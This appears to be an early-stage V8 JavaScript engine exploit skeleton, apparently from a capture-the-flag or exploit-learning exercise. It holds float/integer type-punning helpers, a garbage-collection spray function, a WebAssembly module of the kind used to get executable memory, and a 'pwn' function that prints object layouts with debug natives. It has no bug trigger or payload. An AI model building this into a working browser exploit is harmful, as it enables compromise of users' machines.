function gc() { for (let i = 0; i < 0x10; i++) { new ArrayBuffer(0x1000000); } }

// convert_stuff

var _b = new ArrayBuffer(16);
var _f = new Float64Array(_b);
var _i = new BigUint64Array(_b);

// converts float to big unsigned int
function f2i(f) 
{
    _f[0] = f;
    return _i[0];
}

// converts big unsigned int to float

function i2f(i)
{
    _i[0] = i;
    return _f[0];
}

// converts to hex format

function hex(i)
{
    return "0x"+i.toString(16).padStart(16, "0");
}

// convert stuff 2
var f64 = new Float64Array(1);
var u32 = new Uint32Array(f64.buffer);

function d2u(v)
{
    f64[0] = v;
    return u32[0];
}

function u2d(lo, hi) 
{
    u32[0] = lo;
    u32[1] = hi;
    return f64[0];
}

function hex_2(lo, hi) 
{
    if (lo == 0) {
        return ("0x" + hi.toString(16) + "-00000000");
    }
    if (hi == 0) {
        return ("0x" + lo.toString(16));
    }
    return ("0x" + hi.toString(16) + "-" + lo.toString(16));
}

// create wasm code
var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var f = wasmInstance.exports.main;

// 
function pwn()
{
    let arr = [0x1234, 0x1338, 3.3];
    let leaked_array = [u2d(0xbeef, 0xbeef), f, f, f];
    let ab = new ArrayBuffer(0x1338);
    %DebugPrint(arr);
    %DebugPrint(leaked_array);
    %DebugPrint(ab);
    %DebugPrint(f);
}

pwn();
